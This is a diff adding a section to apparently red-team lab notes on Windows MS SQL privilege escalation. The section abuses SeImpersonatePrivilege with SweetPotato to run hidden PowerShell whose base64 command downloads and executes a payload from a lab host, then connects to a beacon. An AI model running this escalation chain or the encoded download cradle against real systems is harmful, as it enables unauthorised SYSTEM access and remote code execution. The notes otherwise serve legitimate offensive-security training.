@@ -214,3 +214,16 @@ SQLRecon also has a lxpcmd module. Once the payload has been executed, connect t
 	[+] established link to child beacon: 10.10.120.25
 
 
+## MS SQL Privilege Escalation
+
+This instance of SQL is running as NT Service\MSSQLSERVER, the default. It has a special type of privilege called SeImpersonatePrivilege, which allows the account to "impersonate a client after authentication":
+
+	beacon> getuid
+	[*] You are NT Service\MSSQLSERVER
+	beacon> execute-assembly Seatbelt.exe TokenPrivileges
+
+This allows the user to impersonate a token that it's able to get a handle to. This account is not LA so it can't just get a handle to a higher-privileged process (e.g. SYSTEM). One strategy is to force a SYSTEM service to authenticate to a rogue service that the attacker creates, which is then able to impersonate the SYSTEM service. [SweetPotato](https://github.com/CCob/SweetPotato) has a collection of techniques:
+
+	beacon> execute-assembly SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA=="
+	beacon> connect localhost 4444
+
